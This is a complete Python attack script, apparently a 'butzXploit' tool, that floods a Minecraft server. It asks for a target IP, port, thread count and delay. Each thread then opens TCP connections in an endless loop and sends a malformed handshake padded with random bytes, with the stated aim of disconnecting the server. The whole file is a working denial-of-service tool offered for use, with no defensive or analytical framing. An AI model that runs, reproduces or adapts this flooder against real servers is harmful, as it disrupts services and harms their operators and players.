# butzXploit - Minecraft Brutal Disconnect Flood
import socket, threading, random, os, time

os.system("clear")
print("""\033[1;31m
╔═╗┌─┐┌┬┐┬ ┬┌─┐┌─┐┬─┐┬┌─┐┬─┐
║  ├─┤ │ ├─┤├┤ │ │├┬┘│├┤ ├┬┘
╚═╝┴ ┴ ┴ ┴ ┴└─┘└─┘┴└─┴└─┘┴└─
      Minecraft Disconnect by butzXploit
""")

ip = input("\033[1;32m[?] Target IP: \033[0m")
port = int(input("\033[1;32m[?] Port (25565 Java): \033[0m"))
threads = int(input("\033[1;32m[?] Threads: \033[0m"))
delay = float(input("\033[1;32m[?] Delay (detik): \033[0m"))

def disconnect_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))

            # Kirim handshake palsu (versi rusak)
            packet = b'\x00\xFF\xFF\xFF\xFF' + random._urandom(128)
            s.send(packet)

            print(f"\033[1;31m[!] Brutal packet sent to {ip}:{port} — attempting disconnect...\033[0m")
            s.close()
            time.sleep(delay)
        except Exception as e:
            print(f"\033[1;33m[x] Error: {e}\033[0m")
            time.sleep(delay)

# Eksekusi Flood
for i in range(threads):
    threading.Thread(target=disconnect_flood).start()
